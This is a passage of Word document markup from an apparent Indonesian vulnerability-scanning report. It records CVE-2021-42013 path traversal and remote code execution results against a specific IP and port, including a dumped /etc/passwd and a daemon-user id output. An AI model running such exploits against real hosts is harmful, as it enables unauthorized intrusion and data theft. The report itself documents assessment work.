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Pemindaian Kerentanan dan Eksploitasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)</w:t>
        <w:br/>
        <w:t>root:x:0:0:root:/root:/bin/bash</w:t>
        <w:br/>
        <w:t>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>bin:x:2:2:bin:/bin:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>sys:x:3:3:sys:/dev:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>sync:x:4:65534:sync:/bin:/bin/sync</w:t>
        <w:br/>
        <w:t>games:x:5:60:games:/usr/games:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:br/>
        <w:t>http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)</w:t>
        <w:br/>
        <w:t>uid=1(daemon) gid=1(daemon) groups=1(daemon)</w:t>
        <w:br/>
        <w:br/>
        <w:t>[+] whoami:</w:t>
        <w:br/>
        <w:br/>
        <w:t>[+] ls:</w:t>
        <w:br/>
        <w:br/>
        <w:t>[+] pwd:</w:t>
        <w:br/>
        <w:br/>
        <w:t>[+] uname -a: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